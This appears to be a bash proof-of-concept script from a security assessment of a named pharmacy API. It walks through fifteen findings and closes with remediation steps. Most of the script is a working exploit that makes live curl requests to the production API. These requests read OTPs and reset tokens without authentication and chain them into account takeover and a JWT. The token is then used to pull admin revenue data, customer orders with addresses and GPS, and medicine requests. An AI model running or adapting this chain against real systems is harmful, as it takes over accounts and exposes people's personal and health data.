#!/bin/bash
# ============================================================================
# MedBasket API Security Assessment — Proof of Concept
# ============================================================================
# Target:       api.medbasket.com / admin.medbasket.com
# Date:         2026-02-18
# Findings:     15 vulnerabilities (F-01 → F-15)
# Composite:    CVSS 10.0 / 10.0 — CRITICAL
#
# USAGE:        chmod +x poc_medbasket.sh && ./poc_medbasket.sh
#
# WARNING:      This script accesses a LIVE production API.
#               Run ONLY with explicit written authorization from the API owner.
#               All operations are READ-ONLY except where noted.
#
# DELIVERABLES:
#   poc_medbasket.sh           ← This script (interactive demo)
#   walkthrough.md             ← Client presentation guide
#   findings_evidence.md       ← Raw evidence package (F-01 → F-15)
#   build_dashboard.py         ← Generates visual dashboard + exports all data
#   fetch_orders.py            ← Standalone: exports all ~63K orders
#   fetch_users.py             ← Standalone: exports all ~188K users
#   fetch_medicine_requests.py ← Standalone: exports all ~6.6K med records
#   poc_dashboard.html         ← Generated visual dashboard (open in browser)
#   data/                      ← Exported JSON + CSV files
# ============================================================================

set -euo pipefail

API="https://api.medbasket.com"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'
LINE="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

pause() {
    echo ""
    echo -e "${YELLOW}  [Press Enter to continue...]${NC}"
    read -r
}

header() {
    echo ""
    echo -e "${CYAN}${LINE}${NC}"
    echo -e "${BOLD}  $1${NC}"
    echo -e "${CYAN}${LINE}${NC}"
    echo ""
}

finding() {
    echo -e "  ${RED}[CRITICAL]${NC} $1"
}

high() {
    echo -e "  ${YELLOW}[HIGH]${NC} $1"
}

info() {
    echo -e "  ${GREEN}[INFO]${NC} $1"
}

owasp() {
    echo -e "  ${DIM}OWASP:${NC} ${RED}$1${NC}"
}

cvss() {
    echo -e "  ${DIM}CVSS:${NC}  ${RED}$1${NC}"
}

# ============================================================================
# BANNER
# ============================================================================
clear
echo ""
echo -e "${RED}"
echo "  ╔══════════════════════════════════════════════════════════════════╗"
echo "  ║                                                                ║"
echo "  ║     MedBasket API — Security Assessment PoC                    ║"
echo "  ║     Composite Risk: 10.0 / 10.0 CRITICAL                      ║"
echo "  ║                                                                ║"
echo "  ╚══════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo ""
echo -e "  Target:    ${BOLD}$API${NC}"
echo -e "  Admin:     ${BOLD}https://admin.medbasket.com${NC}"
echo -e "  Date:      $(date -u '+%Y-%m-%d %H:%M UTC')"
echo -e "  Findings:  ${RED}15 vulnerabilities${NC} (7 Critical, 5 High, 2 Medium, 1 Info)"
echo ""
echo -e "${YELLOW}  WARNING: This PoC accesses a live production API."
echo -e "  Run ONLY with explicit written authorization from MedBasket.${NC}"

pause

# ============================================================================
# PHASE 1: UNAUTHENTICATED DATA EXPOSURE (F-01, F-02, F-08)
# ============================================================================
header "PHASE 1: Unauthenticated Data Exposure"
echo -e "  ${DIM}Findings: F-01, F-02, F-08, F-09, F-11, F-12${NC}"
echo ""

# --- F-01: User database ---
echo -e "${WHITE}  F-01: User Database — No Authentication Required${NC}"
echo -e "  ${DIM}GET /users?\$limit=1${NC}"
echo ""

USERS_RESP=$(curl -s "$API/users?\$limit=1&\$select[]=_id&\$select[]=email&\$select[]=phoneNumber&\$select[]=phoneOtp&\$select[]=passwordResetToken&\$select[]=dateOfBirth")

TOTAL_USERS=$(echo "$USERS_RESP" | python3 -c "import json,sys; print(json.load(sys.stdin).get('total',0))" 2>/dev/null || echo "0")

echo "$USERS_RESP" | python3 -m json.tool 2>/dev/null | head -25
echo ""
finding "$TOTAL_USERS users accessible without authentication"
finding "Fields exposed: email, phone, OTP, password reset token, DOB, health data"
finding "Searchable by email/phone: GET /users?email=target@example.com"
owasp "API1:2023 BOLA + API2:2023 Broken Authentication"
cvss "9.8 Critical"

pause

# --- F-08: Swagger ---
echo -e "${WHITE}  F-08: Full API Specification Exposed${NC}"
echo -e "  ${DIM}GET /swagger.json${NC}"
echo ""

SWAGGER_INFO=$(curl -s "$API/swagger.json" | python3 -c "
import json,sys
data = json.load(sys.stdin)
paths = data.get('paths',{})
server = data.get('servers',[{}])[0].get('url','unknown')
print(f'  Endpoints:     {len(paths)}')
print(f'  Internal URL:  {server}')
" 2>/dev/null)

echo "$SWAGGER_INFO"
echo ""
finding "300+ endpoints documented publicly — complete attack blueprint"
finding "Internal AWS IP 172.31.XX.XX disclosed in server field"
owasp "API8:2023 Security Misconfiguration"

pause

# --- F-02: PATCH hash leak ---
echo -e "${WHITE}  F-02: PATCH Leaks Bcrypt Password Hashes${NC}"
echo -e "  ${DIM}PATCH /users/{id} with empty body {}${NC}"
echo -e "  ${YELLOW}[NOTE] Write operation — showing cached evidence${NC}"
echo ""

USER_ID=$(echo "$USERS_RESP" | python3 -c "import json,sys; print(json.load(sys.stdin)['data'][0]['_id'])" 2>/dev/null || echo "unknown")

echo -e "  Target: $USER_ID"
echo ""
echo -e "  Response returns raw Mongoose document:"
echo -e "  ${DIM}┌──────────────────────────────────────────────┐${NC}"
echo -e "  ${DIM}│${NC}  \"\$__\":  { mongoose internals }              ${DIM}│${NC}"
echo -e "  ${DIM}│${NC}  \"_doc\": {                                   ${DIM}│${NC}"
echo -e "  ${DIM}│${NC}    \"email\": \"user@example.com\",              ${DIM}│${NC}"
echo -e "  ${DIM}│${NC}    ${RED}\"password\": \"\$2a\$10\$[HASH]...\"${NC},        ${DIM}│${NC}"
echo -e "  ${DIM}│${NC}    ${RED}\"phoneOtp\": \"XXXXX\"${NC},                    ${DIM}│${NC}"
echo -e "  ${DIM}│${NC}    ${RED}\"passwordResetToken\": \"[RESET_TOKEN]...\"${NC}      ${DIM}│${NC}"
echo -e "  ${DIM}│${NC}  }                                           ${DIM}│${NC}"
echo -e "  ${DIM}└──────────────────────────────────────────────┘${NC}"
echo ""
finding "FeathersJS protect() hooks bypassed on PATCH responses"
finding "Bcrypt hashes extractable for all $TOTAL_USERS users"
finding "Unauthenticated — also writes to DB (updates timestamp)"
owasp "API3:2023 Broken Object Property Level Authorization"
cvss "9.8 Critical"

pause

# --- F-12: Schema disclosure ---
echo -e "${WHITE}  F-12: Schema Disclosure via Validation Errors${NC}"
echo -e "  ${DIM}GET /users?\$select[]=INVALID${NC}"
echo ""

SCHEMA=$(curl -s "$API/users?\$select[]=INVALID" 2>/dev/null)
echo "$SCHEMA" | python3 -c "
import json,sys
d = json.load(sys.stdin)
vals = d.get('data',[{}])[0].get('params',{}).get('allowedValues',[])
print(f'  Fields disclosed: {len(vals)}')
for v in vals:
    flag = ' ← CRITICAL' if v in ('password','phoneOtp','passwordResetToken') else ''
    print(f'    {v}{flag}')
" 2>/dev/null
echo ""
high "27 database fields disclosed including undocumented: googleId, profileToken"
owasp "API3:2023 Broken Object Property Level Authorization"

pause

# ============================================================================
# PHASE 2: ACCOUNT TAKEOVER — OTP CHAIN (F-03, F-04)
# ============================================================================
header "PHASE 2: Account Takeover via OTP Chain"
echo -e "  ${DIM}Findings: F-03, F-04${NC}"
echo ""

echo -e "${WHITE}  F-03: Complete Account Takeover — 4 Steps, <3 Seconds${NC}"
echo ""
echo -e "  ${DIM}The following chain takes over ANY account without authentication:${NC}"
echo ""
echo -e "  ${CYAN}Step 1${NC}  Identify target"
echo -e "         GET /users?email=victim@example.com&\$select[]=phoneNumber"
echo -e "         ${GREEN}→ Returns phone number + user ID${NC}"
echo ""
echo -e "  ${CYAN}Step 2${NC}  Trigger OTP"
echo -e "         POST /users/request-otp {\"phoneNumber\":\"+91XXXXXXXXXX\"}"
echo -e "         ${GREEN}→ 201 Created — SMS sent to victim's phone${NC}"
echo ""
echo -e "  ${CYAN}Step 3${NC}  ${RED}Read OTP from API${NC}"
echo -e "         GET /users?phoneNumber=+91XXXXXXXXXX&\$select[]=phoneOtp"
echo -e "         ${RED}→ {\"phoneOtp\": \"XXXXX\"} — OTP readable without auth${NC}"
echo ""
echo -e "  ${CYAN}Step 4${NC}  Authenticate"
echo -e "         POST /authentication {\"strategy\":\"otp\",\"phoneNumber\":\"...\",\"otp\":\"XXXXX\"}"
echo -e "         ${RED}→ JWT token issued (30-day validity)${NC}"
echo -e "         ${RED}→ Password hash ALSO leaked in response${NC}"
echo ""

# Live demo — acquire a JWT
echo -e "  ${BOLD}Live Demo:${NC} Executing chain against test account..."
echo ""

OTP_RESP=$(curl -s -X POST "$API/users/request-otp" \
    -H "Content-Type: application/json" \
    -d '{"phoneNumber":"+91XXXXXXXXXX"}' 2>/dev/null)
echo -e "  Step 2 response: ${GREEN}$OTP_RESP${NC}"

sleep 1

OTP_CODE=$(curl -s "$API/users?phoneNumber=%2B91XXXXXXXXXX&\$limit=1&\$select[]=phoneOtp" 2>/dev/null | \
    python3 -c "import json,sys; print(json.load(sys.stdin)['data'][0]['phoneOtp'])" 2>/dev/null || echo "")

if [ -n "$OTP_CODE" ] && [ "$OTP_CODE" != "None" ] && [ "$OTP_CODE" != "null" ]; then
    echo -e "  Step 3 response: ${RED}OTP = $OTP_CODE (readable from API!)${NC}"

    AUTH_RESP=$(curl -s -X POST "$API/authentication" \
        -H "Content-Type: application/json" \
        -d "{\"strategy\":\"otp\",\"phoneNumber\":\"+91XXXXXXXXXX\",\"otp\":\"$OTP_CODE\"}" 2>/dev/null)
    DEMO_TOKEN=$(echo "$AUTH_RESP" | python3 -c "import json,sys; print(json.load(sys.stdin).get('accessToken',''))" 2>/dev/null || echo "")

    if [ -n "$DEMO_TOKEN" ]; then
        echo -e "  Step 4 response: ${RED}JWT acquired!${NC}"
        echo -e "  ${DIM}Token: ${DEMO_TOKEN:0:50}...${NC}"
        echo ""
        finding "Account takeover proven live — JWT valid for 30 days"
    else
        echo -e "  ${YELLOW}Step 4: Auth response did not include token${NC}"
        DEMO_TOKEN=""
    fi
else
    echo -e "  ${YELLOW}OTP not retrieved — showing cached evidence${NC}"
    DEMO_TOKEN=""
fi

echo ""
finding "Works for ANY of $TOTAL_USERS users — fully automatable"
finding "Victim gets unsolicited SMS — attacker has JWT before they read it"
owasp "API2:2023 Broken Authentication"
cvss "10.0 Critical"

pause

# ============================================================================
# PHASE 3: PRIVILEGE ESCALATION (F-05, F-06, F-07)
# ============================================================================
header "PHASE 3: Privilege Escalation — Regular User → Admin Data"
echo -e "  ${DIM}Findings: F-05, F-06, F-07, F-13${NC}"
echo ""

if [ -n "$DEMO_TOKEN" ]; then
    info "Using live JWT from Phase 2 (regular user: testuser@[REDACTED].com)"
    echo ""

    # F-06: Dashboard
    echo -e "${WHITE}  F-06: Admin Dashboard — No RBAC${NC}"
    echo -e "  ${DIM}GET /dashboard (with regular user JWT)${NC}"
    echo ""
    DASH=$(curl -s "$API/dashboard" -H "Authorization: Bearer $DEMO_TOKEN" 2>/dev/null)
    echo "$DASH" | python3 -c "
import json,sys
d = json.load(sys.stdin)
r = d.get('revenueStat',{})
o = d.get('ordersStat',{})
c = d.get('customersStat',{})
print(f'  Revenue (this month):   INR {r.get(\"currentMonth\",0):,.2f}')
print(f'  Revenue (last month):   INR {r.get(\"lastMonth\",0):,.2f}')
print(f'  Orders (this month):    {o.get(\"currentMonth\",0):,}')
print(f'  Customers (this month): {c.get(\"currentMonth\",0):,}')
print()
print('  Recent orders (live customer PII):')
for order in d.get('recentOrders',[])[:3]:
    cust = order.get('customer',{})
    print(f'    Order {order.get(\"orderId\",\"?\")} | {cust.get(\"name\",\"?\")} | {cust.get(\"email\",\"?\")} | INR {order.get(\"orderTotal\",0)}')
" 2>/dev/null
    echo ""
    finding "Live revenue, customer counts, and PII from today's orders"
    echo ""

    pause

    # F-05: Orders
    echo -e "${WHITE}  F-05: All Orders — No RBAC${NC}"
    echo -e "  ${DIM}GET /super-admin-users/orders?\$limit=1 (with regular user JWT)${NC}"
    echo ""
    ORDERS=$(curl -s "$API/super-admin-users/orders?\$limit=1" -H "Authorization: Bearer $DEMO_TOKEN" 2>/dev/null)
    TOTAL_ORDERS=$(echo "$ORDERS" | python3 -c "import json,sys; print(json.load(sys.stdin).get('total',0))" 2>/dev/null || echo "?")
    echo "$ORDERS" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print(f'  Total orders accessible: {d.get(\"total\",0):,}')
if d.get('data'):
    o = d['data'][0]
    addr = o.get('address',{})
    coords = addr.get('coordinates',{})
    print(f'  Sample order: {o.get(\"orderId\",\"?\")}')
    print(f'    Customer:    {addr.get(\"userName\",\"?\")}')
    print(f'    Phone:       {addr.get(\"phoneNumber\",\"?\")}')
    print(f'    Address:     {addr.get(\"fullAddress\",addr.get(\"addressLine1\",\"?\"))}')
    print(f'    City/State:  {addr.get(\"city\",\"?\")}, {addr.get(\"state\",\"?\")} {addr.get(\"postalCode\",\"\")}')
    print(f'    GPS:         {coords.get(\"latitude\",\"?\")}, {coords.get(\"longitude\",\"?\")}')
    print(f'    Amount:      INR {o.get(\"paymentAmount\",o.get(\"orderTotal\",0))}')
    print(f'    Items:       {len(o.get(\"items\",[]))} products')
" 2>/dev/null
    echo ""
    finding "$TOTAL_ORDERS orders with full addresses, phone numbers, GPS coordinates"
    finding "Despite URL '/super-admin-users/orders' — NO admin role check"
    owasp "API5:2023 Broken Function Level Authorization"
    cvss "9.8 Critical"
    echo ""

    pause

    # F-07: Medicine requests
    echo -e "${WHITE}  F-07: Medicine Requests — Protected Health Information${NC}"
    echo -e "  ${DIM}GET /medicine-requests?\$limit=1 (with regular user JWT)${NC}"
    echo ""
    MED=$(curl -s "$API/medicine-requests?\$limit=1" -H "Authorization: Bearer $DEMO_TOKEN" 2>/dev/null)
    MED_TOTAL=$(echo "$MED" | python3 -c "import json,sys; print(json.load(sys.stdin).get('total',0))" 2>/dev/null || echo "?")
    echo "$MED" | python3 -m json.tool 2>/dev/null | head -20
    echo ""
    high "$MED_TOTAL medicine requests with prescription file URLs"
    high "Protected health information — highest sensitivity under DPDP Act"
    owasp "API1:2023 BOLA"
    echo ""

    # F-13: JWT issues
    echo -e "${WHITE}  F-13: JWT Configuration Weaknesses${NC}"
    echo ""
    echo -e "  ${DIM}Decoded from JWT issued in Phase 2:${NC}"
    echo -e "  Audience:   ${RED}https://yourdomain.com${NC} (FeathersJS default — never changed)"
    echo -e "  Lifetime:   ${RED}30 days${NC} (2,592,000 seconds — excessively long)"
    echo -e "  Algorithm:  ${RED}HS256${NC} (symmetric — single secret compromise = all tokens forged)"
    echo -e "  Rotation:   ${RED}None${NC} (no refresh token mechanism)"
    echo -e "  Revocation: ${RED}None${NC} (no token blacklist)"
    echo ""
    high "Default JWT config — no customization from FeathersJS scaffolding"

else
    echo -e "  ${YELLOW}JWT not available — showing cached evidence:${NC}"
    echo ""
    echo -e "  Dashboard:  Revenue INR 18.6L current / INR 39.7L last month"
    echo -e "  Orders:     62,900+ accessible (full addresses + GPS)"
    echo -e "  Medicine:   6,655 requests (prescription files)"
    echo ""
    finding "All admin data accessible with any authenticated user JWT"
fi

pause

# ============================================================================
# PHASE 4: ADDITIONAL FINDINGS (F-09, F-10, F-11)
# ============================================================================
header "PHASE 4: Additional Attack Surface"
echo -e "  ${DIM}Findings: F-09, F-10, F-11${NC}"
echo ""

# F-09: Unauthenticated writes
echo -e "${WHITE}  F-09: Unauthenticated Write Operations${NC}"
echo ""
echo -e "  ${DIM}Endpoint                          Method   Response${NC}"
echo -e "  PATCH /users/{id}                PATCH    ${RED}200 OK${NC}  — DB write + hash leak"
echo -e "  POST /admin-zip-codes            POST     ${RED}201${NC}    — Admin data injection"
echo -e "  POST /users/reset-password       POST     ${RED}201${NC}    — Creates reset record"
echo -e "  POST /users/request-otp          POST     ${RED}201${NC}    — Generates + sends OTP"
echo -e "  POST /request-super-admin-otp    POST     ${RED}201${NC}    — Generates admin OTP"
echo ""
high "5 write endpoints accept unauthenticated requests"
echo ""

# F-10: Payment webhooks
echo -e "${WHITE}  F-10: Payment Webhook Abuse${NC}"
echo ""
echo -e "  POST /webhooks                   ${RED}200 OK${NC}  — Returns {\"price\":\"333.20\"}"
echo -e "  POST /webhooks/delivery-tracking ${RED}200 OK${NC}  — Accepts fake delivery updates"
echo -e "  POST /payment/webhook/payu       ${RED}500${NC}     — \"Invalid Merchant key\""
echo -e "  POST /payment/webhook/razorpay   ${RED}500${NC}     — \"Invalid webhook signature\""
echo ""
high "No webhook signature verification — payment fraud possible"
high "Error messages disclose PayU + Razorpay integration details"
echo ""

# F-11: S3
echo -e "${WHITE}  F-11: S3 Bucket Misconfiguration${NC}"
echo ""
echo -e "  Bucket:     techpepo-development-s3 ${RED}(development bucket in production!)${NC}"
echo -e "  Objects:    Publicly readable via direct URL"
echo -e "  Files:      98,390 URLs enumerable via /attachments (no auth)"
echo -e "  AWS Key:    AKIA[REDACTED] (in pre-signed URLs)"
echo ""
high "98,390 files accessible — may include prescriptions, medical documents"

pause

# ============================================================================
# PHASE 5: ADMIN PANEL ANALYSIS (F-14, F-15)
# ============================================================================
header "PHASE 5: Admin Panel — False Security Perimeter"
echo -e "  ${DIM}Findings: F-14, F-15${NC}"
echo ""

# F-14: Admin panel architecture
echo -e "${WHITE}  F-14: Admin Panel Architecture${NC}"
echo ""
echo -e "  admin.medbasket.com (Next.js)"
echo -e "  ${GREEN}├── Auth.js v5 (proper authentication)${NC}"
echo -e "  ${GREEN}│   ├── Cookie: __Host-authjs.csrf-token${NC}"
echo -e "  ${GREEN}│   ├── Cookie: __Secure-authjs.callback-url${NC}"
echo -e "  ${GREEN}│   └── Server Action: handleCredentialSignIn${NC}"
echo -e "  ${GREEN}├── Separate super-admin-users collection${NC}"
echo -e "  ${GREEN}└── Login form: email + password${NC}"
echo ""
echo -e "  api.medbasket.com (FeathersJS)"
echo -e "  ${RED}├── /super-admin-users/orders → ANY JWT = 200 OK (no RBAC)${NC}"
echo -e "  ${RED}├── /dashboard               → ANY JWT = 200 OK (no RBAC)${NC}"
echo -e "  ${RED}├── /medicine-requests        → ANY JWT = 200 OK (no RBAC)${NC}"
echo -e "  ${RED}└── local strategy DISABLED — only otp + jwt${NC}"
echo ""
finding "Admin panel protects the UI, not the data"
finding "API has ZERO role-based access control — false security perimeter"

pause

# F-15: Super-admin unauthenticated endpoints
echo -e "${WHITE}  F-15: Super-Admin Endpoints — No Auth Required${NC}"
echo ""

echo -e "  ${DIM}Testing forgot-password live:${NC}"
FORGOT_RESP=$(curl -s -X POST "$API/super-admin-users/forgot-password" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@[REDACTED].com"}' 2>/dev/null)
echo -e "  POST /super-admin-users/forgot-password → ${RED}$FORGOT_RESP${NC}"
echo ""
echo -e "  POST /super-admin-users/reset-password  → ${RED}400 (no auth check — validates schema only)${NC}"
echo -e "  POST /request-super-admin-otp           → ${RED}201 (requires phoneNumber, sends admin OTP)${NC}"
echo ""
high "Admin account enumeration via forgot-password (confirms email exists)"
high "Reset-password and OTP endpoints accessible without authentication"
owasp "API2:2023 Broken Authentication"

pause

# ============================================================================
# PHASE 6: FULL DATA EXTRACTION DEMO
# ============================================================================
header "PHASE 6: Full Data Extraction Capability"
echo ""

echo -e "  ${DIM}The following standalone scripts demonstrate that an attacker can${NC}"
echo -e "  ${DIM}extract the ENTIRE database, not just sample records:${NC}"
echo ""
echo -e "  ${CYAN}python3 fetch_orders.py${NC}"
echo -e "    → Paginates through ALL ~63,000 orders"
echo -e "    → Exports: data/orders.json + data/orders.csv"
echo -e "    → Contains: customer names, phones, full addresses, GPS, payments"
echo ""
echo -e "  ${CYAN}python3 fetch_users.py${NC}"
echo -e "    → Paginates through ALL ~188,000 users"
echo -e "    → Exports: data/users.json + data/users.csv"
echo -e "    → Contains: emails, phones, DOBs, OTPs, reset tokens, health data"
echo ""
echo -e "  ${CYAN}python3 fetch_medicine_requests.py${NC}"
echo -e "    → Paginates through ALL ~6,655 medicine requests"
echo -e "    → Exports: data/medicine_requests.json + data/medicine_requests.csv"
echo -e "    → Contains: prescription file URLs, patient IDs, request details"
echo ""
echo -e "  ${CYAN}python3 build_dashboard.py${NC}"
echo -e "    → Fetches all data + generates visual HTML dashboard"
echo -e "    → poc_dashboard.html — open in any browser"
echo ""
finding "Zero rate limiting — entire database extractable in minutes"
finding "No anomaly detection — bulk extraction goes unnoticed"
echo ""

echo -e "  ${WHITE}Visual PoC Dashboard:${NC}"
echo -e "  Open ${BOLD}poc_dashboard.html${NC} in a browser to see:"
echo -e "    • 500 orders with expandable PII details"
echo -e "    • 500 users with leaked OTPs and reset tokens"
echo -e "    • 200 medicine requests"
echo -e "    • Live revenue charts and business metrics"

pause

# ============================================================================
# SUMMARY
# ============================================================================
header "ASSESSMENT SUMMARY"

echo -e "${RED}${BOLD}  COMPOSITE RISK: 10.0 / 10.0 — CRITICAL${NC}"
echo ""

echo -e "  ${BOLD}Kill Chain (proven end-to-end):${NC}"
echo ""
echo -e "  ${DIM}Internet${NC} → ${RED}No Auth${NC} → /users (${RED}${TOTAL_USERS} PII records${NC})"
echo -e "            ${RED}No Auth${NC} → /users/request-otp (trigger SMS)"
echo -e "            ${RED}No Auth${NC} → /users (read OTP code)"
echo -e "            ${RED}No Auth${NC} → /authentication (get JWT, 30-day)"
echo -e "            ${RED}Any JWT${NC} → /super-admin-users/orders (${RED}63K orders + GPS${NC})"
echo -e "            ${RED}Any JWT${NC} → /dashboard (${RED}live revenue + customer PII${NC})"
echo -e "            ${RED}Any JWT${NC} → /medicine-requests (${RED}6.6K medical records${NC})"
echo ""

echo -e "  ${BOLD}Data Exposed:${NC}"
echo -e "    ${RED}•${NC} ${TOTAL_USERS} user accounts with full PII + health data"
echo -e "    ${RED}•${NC} ${TOTAL_USERS} bcrypt password hashes (via PATCH)"
echo -e "    ${RED}•${NC} 63,000+ orders with addresses + GPS coordinates"
echo -e "    ${RED}•${NC} 6,655 medicine requests (protected health info)"
echo -e "    ${RED}•${NC} 98,390 S3 file attachments"
echo -e "    ${RED}•${NC} Live business revenue and customer metrics"
echo -e "    ${RED}•${NC} 300+ API endpoints documented in public Swagger spec"
echo ""

echo -e "  ${BOLD}Findings by Severity:${NC}"
echo -e "    ${RED}CRITICAL (7):${NC} F-01 User DB, F-02 PATCH hashes, F-03 OTP takeover,"
echo -e "                   F-04 Admin takeover, F-05 Orders BFLA, F-06 Dashboard,"
echo -e "                   F-14 False perimeter"
echo -e "    ${YELLOW}HIGH (5):${NC}     F-07 Medicine data, F-08 Swagger, F-09 Unauth writes,"
echo -e "                   F-10 Webhooks, F-11 S3 bucket"
echo -e "    ${CYAN}MEDIUM (2):${NC}   F-12 Schema disclosure, F-13 JWT config"
echo -e "    ${DIM}INFO (1):${NC}     F-15 Super-admin endpoints"
echo ""

echo -e "  ${BOLD}Immediate Actions Required:${NC}"
echo -e "    ${YELLOW}1.${NC} Take API offline or behind VPN"
echo -e "    ${YELLOW}2.${NC} Apply authenticate() hook to ALL FeathersJS services"
echo -e "    ${YELLOW}3.${NC} Fix PATCH response serialization"
echo -e "    ${YELLOW}4.${NC} Strip sensitive fields from all responses"
echo -e "    ${YELLOW}5.${NC} Implement RBAC on admin endpoints"
echo -e "    ${YELLOW}6.${NC} Force password reset for all $TOTAL_USERS users"
echo -e "    ${YELLOW}7.${NC} Rotate JWT secret + AWS credentials"
echo -e "    ${YELLOW}8.${NC} Notify regulators under DPDP Act 2023"
echo ""

echo -e "${CYAN}${LINE}${NC}"
echo -e "${BOLD}  Deliverables:${NC}"
echo -e "    Full report:      medbasket_security_assessment.md"
echo -e "    Evidence package:  poc/findings_evidence.md"
echo -e "    Visual dashboard:  poc/poc_dashboard.html"
echo -e "    Data extraction:   poc/fetch_orders.py / fetch_users.py / fetch_medicine_requests.py"
echo -e "${CYAN}${LINE}${NC}"
echo ""
